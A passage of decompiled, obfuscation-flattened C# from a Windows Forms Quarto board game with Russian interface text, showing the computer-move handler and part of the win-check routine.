						num11 = 1708628887;
					}
					continue;
				}
				case 2u:
					num = (int)((num2 * 529529319) ^ 0x461B7460);
					continue;
				case 1u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num8]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1643886289) ^ 0x74BB7ED;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 813023539;
						num4 = 813023539;
					}
					else
					{
						num3 = 607569753;
						num4 = 607569753;
					}
					num = num3 ^ ((int)num2 * -2004585144);
					continue;
				}
				default:
					return;
				case 14u:
					break;
				case 20u:
					return;
					IL_0170:
					flag3 = (byte)num12 != 0;
					num = 890167101;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_13fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_142c: Expected O, but got Unknown
		int num32 = default(int);
		int num12 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num27 = default(int);
		int num24 = default(int);
		int num20 = default(int);
		int num44 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num22 = default(int);
		int num23 = default(int);
		int num18 = default(int);
		int num19 = default(int);
		bool flag3 = default(bool);
		int num9 = default(int);
		bool flag4 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag12 = default(bool);
		int num40 = default(int);
		bool flag15 = default(bool);
		int num8 = default(int);
		int num46 = default(int);
		bool flag14 = default(bool);
		int num39 = default(int);
		bool flag5 = default(bool);
		int num7 = default(int);
		bool flag2 = default(bool);
		bool flag16 = default(bool);
		int num17 = default(int);
		int num28 = default(int);
		int num29 = default(int);
		bool flag10 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag7 = default(bool);
		bool flag8 = default(bool);
		bool flag9 = default(bool);
		bool flag13 = default(bool);
		bool flag11 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag6 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 848515004;
			while (true)
			{
				uint num2;
				int num66;
				int num25;
				int num33;
				int num26;
				switch ((num2 = (uint)num ^ 0x21E5C702u) % 179u)
				{
				case 178u:
					num32 = num12;
					num = ((int)num2 * -806095199) ^ -315774765;
					continue;
				case 177u:
					num = (int)((num2 * 578498652) ^ 0x71705052);
					continue;
				case 176u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.LimeGreen);
					num = ((int)num2 * -882870655) ^ 0x69637732;
					continue;
				case 175u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1666085764) ^ 0x3A7FE28;
					continue;
				case 174u:
					Form1.smethod_30((Control)(object)borderBox[num27, num24]);
					num = (int)((num2 * 2014816075) ^ 0x7695D021);
					continue;
				case 173u:
					num = (int)((num2 * 557474690) ^ 0x763097DF);
					continue;
				case 172u:
					num20++;
					num = ((int)num2 * -1006030980) ^ -1653179064;
					continue;
				case 171u:
					num = (int)(num2 * 1733993163) ^ -709457208;
					continue;
				case 170u:
					num44++;
					num = 354554826;
					continue;
				case 169u:
					array2[num22, num23] = new Figurine(storage[num18, num19]);
					num = ((int)num2 * -685655062) ^ -1486933883;
					continue;
				case 168u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = 285168492;
						num14 = 285168492;
					}
					else
					{
						num13 = 1854862687;
						num14 = 1854862687;
					}
					num = num13 ^ ((int)num2 * -1482210842);
					continue;
				}
				case 167u:
					num12 = 0;
					num = 214235328;
					continue;
				case 166u:
					num = 1152990206;
					continue;
				case 165u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 440030187) ^ 0x2A561211);
					continue;
				case 164u:
					board[num9, num44] = new Figurine(storage[num18, num19]);
					storage[num18, num19] = null;
					flag4 = Standoff(board);
					num = (int)((num2 * 19591090) ^ 0x4EAEA3BB);
					continue;
				case 163u:
					if (!Stop(array3))
					{
						num = ((int)num2 * -481679455) ^ -1801290291;
						continue;
					}
					num66 = 1;
					goto IL_0206;
				case 162u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1048375787) ^ -1063783320;
					continue;
				case 161u:
					num = (int)((num2 * 111899788) ^ 0x64F5FE0D);
					continue;
				case 160u:
					num4 = 0;
					num = 1280923662;
					continue;
				case 159u:
					num = (int)((num2 * 1476580613) ^ 0x600730D8);
					continue;
				case 158u:
					flag12 = num44 < 4;
					num = 1552648831;
					continue;
				case 157u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 889350267) ^ -1381851003;
					continue;
				case 156u:
					num = 1693197501;
					continue;
				case 155u:
					num40 = num20;
					num = (int)((num2 * 686548624) ^ 0x22E895BE);
					continue;
				case 154u:
				{
					int num56;
					int num57;
					if (!flag15)
					{
						num56 = -2048535885;
						num57 = -2048535885;
					}
					else
					{
						num56 = -547077129;
						num57 = -547077129;
					}
					num = num56 ^ (int)(num2 * 1331926070);
					continue;
				}
				case 153u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 504890589) ^ -382890184;
					continue;
				case 152u:
					num9++;
					num = (int)(num2 * 94680844) ^ -243086383;
					continue;
				case 151u:
					Form1.smethod_7((Control)(object)pictureBox[num8, num46], bool_0: true);
					num46++;
					num = 1548029823;
					continue;
				case 150u:
					num27 = Form1.smethod_33(rnd, 4);
					num = 716939677;
					continue;
				case 149u:
					num = (int)(num2 * 259623538) ^ -1258114789;
					continue;
				case 148u:
					num40 = 0;
					num32 = 0;
					num = ((int)num2 * -2111715516) ^ 0x6A069420;
					continue;
				case 147u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -873585832) ^ 0x4277E85E;
					continue;
				case 146u:
					num12++;
					num = ((int)num2 * -314623677) ^ 0x513A37FD;
					continue;
				case 145u:
					flag14 = num12 < 4;
					num = 871769122;
					continue;
				case 144u:
					num18 = num3;
					num19 = num4;
					num = (int)(num2 * 939648425) ^ -1976550240;
					continue;
				case 143u:
					num = 1301948399;
					continue;
				case 142u:
					num = (int)(num2 * 512906587) ^ -1577451252;
					continue;
				case 141u:
				{
					int num43;
					if (Standoff(board))
					{
						num = 613899172;
						num43 = 613899172;
					}
					else
					{
						num = 800585091;
						num43 = 800585091;
					}
					continue;
				}
				case 140u:
					num20 = 0;
					num = ((int)num2 * -1331806127) ^ -1685849273;
					continue;
				case 139u:
					num = ((int)num2 * -374736602) ^ -1205595304;
					continue;
				case 138u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					num = (int)((num2 * 1064924899) ^ 0x4CE9F293);
					continue;
				case 137u:
					num3++;
					num = ((int)num2 * -1572170433) ^ -1799371415;
					continue;
				case 136u:
					num39++;
					num = ((int)num2 * -2039012623) ^ 0x3037F59F;
					continue;
				case 135u:
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.White);
					num = ((int)num2 * -1689792908) ^ 0x1BB54CDA;
					continue;
				case 134u:
					num8++;
					num = (int)(num2 * 871868663) ^ -1674705595;
					continue;
				case 133u:
					num = (int)(num2 * 851570855) ^ -939176529;
					continue;
				case 132u:
					num = (int)((num2 * 1363875278) ^ 0x392E4C46);
					continue;
				case 131u:
					num = ((int)num2 * -240238745) ^ -123215724;
					continue;
				case 130u:
					num = ((int)num2 * -637862067) ^ 0x113148D1;
					continue;
				case 129u:
				{
					int num30;
					int num31;
					if (flag5)
					{
						num30 = 754556995;
						num31 = 754556995;
					}
					else
					{
						num30 = 1173086403;
						num31 = 1173086403;
					}
					num = num30 ^ ((int)num2 * -759721904);
					continue;
				}
				case 128u:
					num = ((int)num2 * -281769562) ^ 0x214FA7FD;
					continue;
				case 127u:
					board[num22, num23] = new Figurine(storage[num18, num19]);
					storage[num18, num19] = null;
					Form1.smethod_5((Control)(object)borderBox[num27, num24], Color.Blue);
					num = (int)(num2 * 1141270546) ^ -2079294381;
					continue;
				case 126u:
					num = 738746827;
					continue;
				case 125u:
				{
					int num15;
					int num16;
					if (!flag4)
					{
						num15 = 902380674;
						num16 = 902380674;
					}
					else
					{
						num15 = 747780697;
						num16 = 747780697;
					}
					num = num15 ^ ((int)num2 * -859343803);
					continue;
				}
				case 124u:
					num = (int)((num2 * 1767443984) ^ 0x6A52FE1C);
					continue;
				case 123u:
					num7++;
					flag2 = false;
					num = ((int)num2 * -1464340146) ^ 0x5E2D884E;
					continue;
				case 122u:
					num8 = 0;
					num = (int)((num2 * 1892552331) ^ 0x40BA9C7B);
					continue;
				case 121u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -94642582) ^ -834969425;
					continue;
				case 120u:
				{
					int num67;
					int num68;
					if (flag16)
					{
						num67 = -217053366;
						num68 = -217053366;
					}
					else
					{
						num67 = -633058365;
						num68 = -633058365;
					}
					num = num67 ^ ((int)num2 * -1286808746);
					continue;
				}
				case 119u:
					num = (int)((num2 * 1358412445) ^ 0x4E3CEFD7);
					continue;
				case 118u:
					flag16 = array2[num39, num17] == null;
					num = 777474845;
					continue;
				case 117u:
					num66 = (Standoff(array3) ? 1 : 0);
					goto IL_0206;
				case 116u:
					num = ((int)num2 * -1151475306) ^ -982789105;
					continue;
				case 115u:
					board[num28, num29] = new Figurine(storage[num40, num32]);
					num = (int)((num2 * 1522238294) ^ 0x3BF3CD49);
					continue;
				case 114u:
				{
					int num64;
					int num65;
					if (!flag10)
					{
						num64 = 1080022009;
						num65 = 1080022009;
					}
					else
					{
						num64 = 489189676;
						num65 = 489189676;
					}
					num = num64 ^ (int)(num2 * 1549236048);
					continue;
				}
				case 113u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -778832060) ^ 0x3BB2C054;
					continue;
				case 112u:
					num3 = 0;
					num = ((int)num2 * -1699844239) ^ -743995664;
					continue;
				case 110u:
					num = 1409618789;
					continue;
				case 109u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = ((int)num2 * -403363402) ^ -1301420590;
					continue;
				case 108u:
					num44 = 0;
					num = 354554826;
					continue;
				case 107u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num18, num19]), num44 * size + 4, num9 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1514000517) ^ 0x162AC89D);
					continue;
				case 106u:
					num = (int)(num2 * 1122836108) ^ -1714473690;
					continue;
				case 105u:
					Form1.smethod_20(pictureBox[num18, num19], (Image)null);
					num = ((int)num2 * -815199267) ^ 0x7479D288;
					continue;
				case 104u:
					num28 = 0;
					num29 = 0;
					num = ((int)num2 * -1586819805) ^ 0x2857B51D;
					continue;
				case 103u:
				{
					int num62;
					int num63;
					if (flag7)
					{
						num62 = 451431535;
						num63 = 451431535;
					}
					else
					{
						num62 = 352138671;
						num63 = 352138671;
					}
					num = num62 ^ ((int)num2 * -2027903088);
					continue;
				}
				case 102u:
					num = (int)(num2 * 891279475) ^ -1788682181;
					continue;
				case 101u:
					num = (int)((num2 * 937085107) ^ 0x1770CD0B);
					continue;
				case 100u:
				{
					int num60;
					int num61;
					if (flag8)
					{
						num60 = -588383765;
						num61 = -588383765;
					}
					else
					{
						num60 = -1640388179;
						num61 = -1640388179;
					}
					num = num60 ^ ((int)num2 * -535391691);
					continue;
				}
				case 99u:
				{
					int num58;
					int num59;
					if (Form1.smethod_41((Control)(object)borderBox[num20, num12]) == Color.Blue)
					{
						num58 = -143261726;
						num59 = -143261726;
					}
					else
					{
						num58 = -2080327771;
						num59 = -2080327771;
					}
					num = num58 ^ ((int)num2 * -1530225244);
					continue;
				}
				case 98u:
					num = (int)(num2 * 2014525465) ^ -340011518;
					continue;
				case 97u:
					num = ((int)num2 * -927651924) ^ -120745832;
					continue;
				case 96u:
					num = ((int)num2 * -1857763085) ^ 0x306AFE80;
					continue;
				case 95u:
					num = (int)(num2 * 1124544912) ^ -1828172151;
					continue;
				case 94u:
					num23 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -772735482) ^ 0x2C121569;
					continue;
				case 93u:
					num = ((int)num2 * -1300160384) ^ -491367720;
					continue;
				case 92u:
					Form1.smethod_30((Control)(object)pictureBox[num18, num19]);
					num = (int)(num2 * 2128388629) ^ -1682567315;
					continue;
				case 91u:
				{
					int num54;
					int num55;
					if (flag14)
					{
						num54 = -844367527;
						num55 = -844367527;
					}
					else
					{
						num54 = -1761891700;
						num55 = -1761891700;
					}
					num = num54 ^ (int)(num2 * 88709709);
					continue;
				}
				case 90u:
					if (!Stop(board))
					{
						num = (int)(num2 * 1470271351) ^ -837617491;
						continue;
					}
					goto IL_0a3a;
				case 89u:
					num = 1789660329;
					continue;
				case 88u:
					num4++;
					num = (int)(num2 * 1318408502) ^ -1445365362;
					continue;
				case 87u:
					num = (int)((num2 * 1166597845) ^ 0x70908BFF);
					continue;
				case 86u:
				{
					int num52;
					int num53;
					if (Form1.smethod_46((Control)(object)pictureBox1))
					{
						num52 = -614664615;
						num53 = -614664615;
					}
					else
					{
						num52 = -1669056836;
						num53 = -1669056836;
					}
					num = num52 ^ ((int)num2 * -323838875);
					continue;
				}
				case 85u:
					num = 892508482;
					continue;
				case 84u:
					num = ((int)num2 * -324311822) ^ 0x375E7D1E;
					continue;
				case 83u:
					num7 = 0;
					num = (int)(num2 * 563032429) ^ -1335309716;
					continue;
				case 82u:
					flag3 = num9 < 4;
					num = 20683740;
					continue;
				case 81u:
				{
					int num51;
					if (num39 < 4)
					{
						num = 417332970;
						num51 = 417332970;
					}
					else
					{
						num = 220061460;
						num51 = 220061460;
					}
					continue;
				}
				case 80u:
					num = 1000934931;
					continue;
				case 79u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 1996010617) ^ 0x65776017);
					continue;
				case 78u:
				{
					int num49;
					int num50;
					if (!flag9)
					{
						num49 = -802686447;
						num50 = -802686447;
					}
					else
					{
						num49 = -1116884304;
						num50 = -1116884304;
					}
					num = num49 ^ ((int)num2 * -1045515724);
					continue;
				}
				case 77u:
				{
					int num47;
					int num48;
					if (flag13)
					{
						num47 = -2104214760;
						num48 = -2104214760;
					}
					else
					{
						num47 = -1726727636;
						num48 = -1726727636;
					}
					num = num47 ^ (int)(num2 * 434681015);
					continue;
				}
				case 76u:
					num = 375744116;
					continue;
				case 75u:
					num24 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1928139571) ^ -2004486827;
					continue;
				case 74u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1992140759) ^ 0x1AD02239;
					continue;
				case 73u:
					num22 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 765410528) ^ 0x1215EAF2);
					continue;
				case 72u:
					num46 = 0;
					num = 1056197066;
					continue;
				case 71u:
					num = (int)(num2 * 1467826328) ^ -1975855988;
					continue;
				case 70u:
					Paint_Board();
					num = ((int)num2 * -1755987257) ^ 0x27B2627;
					continue;
				case 69u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num44 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 729434651) ^ -1377447842;
					continue;
				case 68u:
					Form1.smethod_30((Control)(object)pictureBox[num20, num12]);
					num = (int)((num2 * 931905022) ^ 0x561260F3);
					continue;
				case 67u:
					num17 = 0;
					num = 1620772305;
					continue;
				case 66u:
					num = ((int)num2 * -1969471698) ^ -1909653829;
					continue;
				case 65u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1138807527) ^ 0x3A4CE8);
					continue;
				case 64u:
					flag11 = num46 < 4;
					num = 1922118489;
					continue;
				case 63u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num9, num44] = new Figurine(storage[num18, num19]);
					num = (int)(num2 * 2122252932) ^ -300888628;
					continue;
				case 62u:
					num = ((int)num2 * -223012840) ^ -1418698549;
					continue;
				case 61u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1920598109;
					continue;
				case 60u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1644522354) ^ -98975911;
					continue;
				case 59u:
					num = (int)(num2 * 925194675) ^ -1299007855;
					continue;
				case 58u:
				{
					int num45;
					if (board[num9, num44] == null)
					{
						num = 1812155896;
						num45 = 1812155896;
					}
					else
					{
						num = 1152990206;
						num45 = 1152990206;
					}
					continue;
				}
				case 57u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num23 + 0.05f) * (float)size, ((float)num22 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -2078929772) ^ -95495056;
					continue;
				case 56u:
					if (num27 == num18)
					{
						num = (int)(num2 * 720381070) ^ -871266994;
						continue;
					}
					num25 = 0;
					goto IL_0e7e;
				case 55u:
					num39 = 0;
					num = ((int)num2 * -962177367) ^ 0x1532D26E;
					continue;
				case 54u:
				{
					int num41;
					int num42;
					if (flag12)
					{
						num41 = 1102468467;
						num42 = 1102468467;
					}
					else
					{
						num41 = 838557009;
						num42 = 838557009;
					}
					num = num41 ^ (int)(num2 * 912491479);
					continue;
				}
				case 53u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1823404487) ^ 0x13841B0F;
					continue;
				case 52u:
					storage[num40, num32] = null;
					num = (int)(num2 * 657447923) ^ -251597882;
					continue;
				case 51u:
					Form1.smethod_30((Control)(object)borderBox[num20, num12]);
					num = ((int)num2 * -1824551084) ^ 0x39DBFC9F;
					continue;
				case 50u:
					num = ((int)num2 * -1561830387) ^ -1325875440;
					continue;
				case 49u:
					Form1.smethod_20(pictureBox[num20, num12], (Image)null);
					num = (int)(num2 * 2076320616) ^ -892960713;
					continue;
				case 48u:
					array = (Figurine[,])Form1.smethod_48((Array)array2);
					array[num39, num17] = new Figurine(storage[num27, num24]);
					num = (int)((num2 * 686590141) ^ 0x14C61D4E);
					continue;
				case 47u:
					flag2 = true;
					num = (int)(num2 * 382647095) ^ -1364638885;
					continue;
				case 46u:
				{
					int num38;
					if (num17 >= 4)
					{
						num = 445427765;
						num38 = 445427765;
					}
					else
					{
						num = 996188328;
						num38 = 996188328;
					}
					continue;
				}
				case 45u:
					num = (int)(num2 * 1057592340) ^ -234453930;
					continue;
				case 44u:
					step++;
					num = ((int)num2 * -1560237671) ^ 0x10DA50C;
					continue;
				case 43u:
					num = (int)(num2 * 1732596588) ^ -741938037;
					continue;
				case 42u:
					num = (int)(num2 * 996799112) ^ -347329773;
					continue;
				case 41u:
					num = ((int)num2 * -1895005688) ^ 0x413AAB19;
					continue;
				case 40u:
				{
					int num36;
					int num37;
					if (!flag6)
					{
						num36 = 1359641176;
						num37 = 1359641176;
					}
					else
					{
						num36 = 1904367637;
						num37 = 1904367637;
					}
					num = num36 ^ ((int)num2 * -1127421079);
					continue;
				}
				case 39u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num18 = 0;
					num = ((int)num2 * -1410903179) ^ 0x762763A8;
					continue;
				case 38u:
				{
					int num34;
					int num35;
					if (!flag11)
					{
						num34 = -2073711247;
						num35 = -2073711247;
					}
					else
					{
						num34 = -175713152;
						num35 = -175713152;
					}
					num = num34 ^ ((int)num2 * -767051643);
					continue;
				}
				case 37u:
					if (!Standoff(board))
					{
						num = 417411879;
						num33 = 417411879;
						continue;
					}
					goto IL_0a3a;
				case 36u:
					flag10 = Stop(array);
					num = (int)((num2 * 1781780862) ^ 0x1F396AA0);
					continue;
				case 35u:
					num = (int)(num2 * 1023195343) ^ -1844809416;
					continue;
				case 34u:
					flag9 = num8 < 4;
					num = 597670864;
					continue;
				case 33u:
					if (!flag2)
					{
						num = ((int)num2 * -416398143) ^ -216138155;
						continue;
					}
					num26 = 1;
					goto IL_1145;
				case 32u:
					Form1.smethod_20(pictureBox[num18, num19], (Image)null);
					num = ((int)num2 * -1231414968) ^ -1337454079;
					continue;
				case 31u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1867813802) ^ -1738061074;
					continue;
				case 30u:
					num28 = num20;
					num29 = num12;
					num = ((int)num2 * -1768661773) ^ 0x5C7EE1D4;
					continue;
				case 29u:
					Form1.smethod_15(timer1);
					num = 1017565147;
					continue;
				case 28u:
					if (storage[num27, num24] != null)
					{
						num = (int)(num2 * 1778277782) ^ -100839278;
						continue;
					}
					num25 = 1;
					goto IL_0e7e;
				case 27u:
					step++;
					num = ((int)num2 * -211676969) ^ 0x545C9C60;
					continue;
				case 26u:
					Form1.smethod_5((Control)(object)borderBox[num20, num12], Color.White);
					num = (int)(num2 * 1052976114) ^ -1023998079;
					continue;
				case 25u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					num = (int)((num2 * 1020741510) ^ 0x6DFBC27);
					continue;
				case 24u:
					flag7 = num20 < 4;
					num = 56406813;
					continue;
				case 23u:
					num19 = 0;
					num = (int)(num2 * 230185160) ^ -610382337;
					continue;
				case 22u:
					num = ((int)num2 * -495434022) ^ -605737502;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1646880726) ^ 0x3E301C57);
					continue;
				case 20u:
					flag = num4 < 4;
					num = 311540951;
					continue;
				case 19u:
					num = ((int)num2 * -277895790) ^ -1688506204;
					continue;
				case 18u:
					Form1.smethod_30((Control)(object)pictureBox[num18, num19]);
					num = ((int)num2 * -1581563144) ^ -1455109256;
					continue;
				case 17u:
					num = (int)((num2 * 1474003045) ^ 0x2256271F);
					continue;
				case 16u:
					num = (int)((num2 * 412369895) ^ 0x6FEB9944);
					continue;
				case 15u:
					num = 956722171;
					continue;
				case 14u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num18, num19]), num23 * size + 4, num22 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1748063295) ^ 0x2A07951F;
					continue;
				case 13u:
					num26 = ((num7 < 9) ? 1 : 0);
					goto IL_1145;
				case 12u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1733931264) ^ 0x26BAEB7F);
					continue;
				case 11u:
					num25 = ((num24 == num19) ? 1 : 0);
					goto IL_0e7e;
				case 9u:
					flag6 = board[num22, num23] != null;
					num = ((int)num2 * -311726555) ^ -1307795192;
					continue;
				case 8u:
				{
					int num21;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num12 * size + size / 2, (int)(((float)num20 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = 389727920;
						num21 = 389727920;
					}
					else
					{
						num = 290571022;
						num21 = 290571022;
					}
					continue;
				}
				case 7u:
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.White);
					num = ((int)num2 * -399026796) ^ -1266629086;
					continue;
				case 6u:
					num = ((int)num2 * -484137655) ^ 0x602D86EB;
					continue;
				case 5u:
					num17++;
					num = 1620772305;
					continue;
				case 4u:
					flag5 = num3 < 4;
					num = 1911798784;
					continue;
				case 3u:
				{
					int num10;
					int num11;
					if (Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Red)
					{
						num10 = 781509339;
						num11 = 781509339;
					}
					else
					{
						num10 = 611959561;
						num11 = 611959561;
					}
					num = num10 ^ (int)(num2 * 70055066);
					continue;
				}
				case 2u:
					Form1.smethod_47(1000);
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num9 = 0;
					num = ((int)num2 * -1843074961) ^ 0x1D4C1743;
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -1042997896;
						num6 = -1042997896;
					}
					else
					{
						num5 = -583784698;
						num6 = -583784698;
					}
					num = num5 ^ ((int)num2 * -2122554901);
					continue;
				}
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = 575493640;
					continue;
				default:
					return;
				case 10u:
					break;
				case 111u:
					return;
					IL_1145:
					flag8 = (byte)num26 != 0;
					num = 2055181928;
					continue;
					IL_0e7e:
					flag13 = (byte)num25 != 0;
					num = 1539156993;
					continue;
					IL_0a3a:
					num = 837398144;
					num33 = 837398144;
					continue;
					IL_0206:
					flag15 = (byte)num66 != 0;
					num = 1748995399;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num3 = default(int);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1321909126;
			while (true)
			{
				uint num2;
				int num18;
				int num56;
				switch ((num2 = (uint)num ^ 0x635BE80Fu) % 75u)
				{
				case 74u:
				{
					int num13;
					int num14;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num13 = 1595159266;
						num14 = 1595159266;
					}
					else
					{
						num13 = 484115298;
						num14 = 484115298;
					}
					num = num13 ^ (int)(num2 * 1360576278);
					continue;
				}
				case 73u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 328703864;
						continue;
					}
					goto IL_007d;
				case 72u:
				{
					int num9;
					int num10;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num9 = -865962562;
						num10 = -865962562;
					}
					else
					{
						num9 = -217075460;
						num10 = -217075460;
					}
					num = num9 ^ (int)(num2 * 1816162459);
					continue;
				}
				case 71u:
				{
					int num51;
					int num52;
					if (mem[num3, 1] != null)
					{
						num51 = 374278701;
						num52 = 374278701;
					}
					else
					{
						num51 = 544895396;
						num52 = 544895396;
					}
					num = num51 ^ (int)(num2 * 1957945600);
					continue;
				}
				case 70u:
				{
					int num35;
					int num36;
					if (mem[num3, 3] == null)
					{
						num35 = 1402156526;
						num36 = 1402156526;
					}
					else
					{
						num35 = 1883945816;
						num36 = 1883945816;
					}
					num = num35 ^ ((int)num2 * -20305961);
					continue;
				}
				case 69u:
				{
					int num46;
					if (mem[0, num3].Point == mem[1, num3].Point)
					{
						num = 1027016846;
						num46 = 1027016846;
					}
					else
					{
						num = 1107479358;
						num46 = 1107479358;
					}
					continue;
				}
				case 68u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -2040421789) ^ 0x5E40E153;
						continue;
					}
					goto IL_0071;
				case 67u:
				{
					int num64;
					int num65;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num64 = 782264960;
						num65 = 782264960;
					}
					else
					{
						num64 = 1638099678;
						num65 = 1638099678;
					}
					num = num64 ^ ((int)num2 * -180052490);
					continue;
				}
				case 66u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -716133676) ^ -727603107;
						continue;
					}
					goto IL_007d;
				case 65u:
				{
					int num42;
					int num43;
					if (mem[3, 3] == null)
					{
						num42 = -1034902341;
						num43 = -1034902341;
					}
					else
					{
						num42 = -738891965;
						num43 = -738891965;
					}
					num = num42 ^ (int)(num2 * 1233248246);
					continue;
				}
				case 64u:
				{
					int num32;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 1263116143;
						num32 = 1263116143;
					}
					else
					{
						num = 1066412102;
						num32 = 1066412102;
					}
					continue;
				}
				case 63u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = (int)((num2 * 1979676105) ^ 0x5B45F051);
						continue;
					}
					goto IL_02a2;
				case 62u:
					if (mem[2, num3].Square != mem[3, num3].Square)
					{
						goto IL_0296;
					}
					goto IL_02a2;
				case 61u:
				{
					int num68;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = 2054507315;
						num68 = 2054507315;
					}
					else
					{
						num = 1776976307;
						num68 = 1776976307;
					}
					continue;
				}
				case 60u:
				{
					int num63;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 1686866815;
						num63 = 1686866815;
					}
					else
					{
						num = 646950837;
						num63 = 646950837;
					}
					continue;
				}
				case 59u:
					result = flag;
					num = 1916114872;
					continue;
				case 58u:
				{
					int num55;
					if (mem[num3, 0].Dark == mem[num3, 1].Dark)
					{
						num = 1011756329;
						num55 = 1011756329;
					}
					else
					{
						num = 298222441;
						num55 = 298222441;
					}
					continue;
				}
				case 57u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = ((int)num2 * -865014110) ^ -175148860;
						continue;
					}
					goto IL_02a2;
				case 56u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 240858270) ^ 0x6E4894CE);
						continue;
					}
					goto IL_007d;
				case 55u:
				{
					int num39;
					int num40;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num39 = -1360016304;
						num40 = -1360016304;
					}
					else
					{
						num39 = -752271140;
						num40 = -752271140;
					}
					num = num39 ^ ((int)num2 * -716154586);
					continue;
				}
				case 54u:
					if (mem[2, 1].Square == mem[3, 0].Square)
					{
						goto IL_0071;
					}
					goto IL_007d;
				case 53u:
				{
					int num25;
					int num26;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num25 = -1549650642;
						num26 = -1549650642;
					}
					else
					{
						num25 = -655174512;
						num26 = -655174512;
					}
					num = num25 ^ ((int)num2 * -1507392162);
					continue;
				}
				case 52u:
					flag = true;
					num = (int)((num2 * 842848366) ^ 0x34FD3674);
					continue;
				case 51u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -157568754) ^ 0x283982BA;
						continue;
					}
					goto IL_0071;
				case 50u:
					num3 = 0;
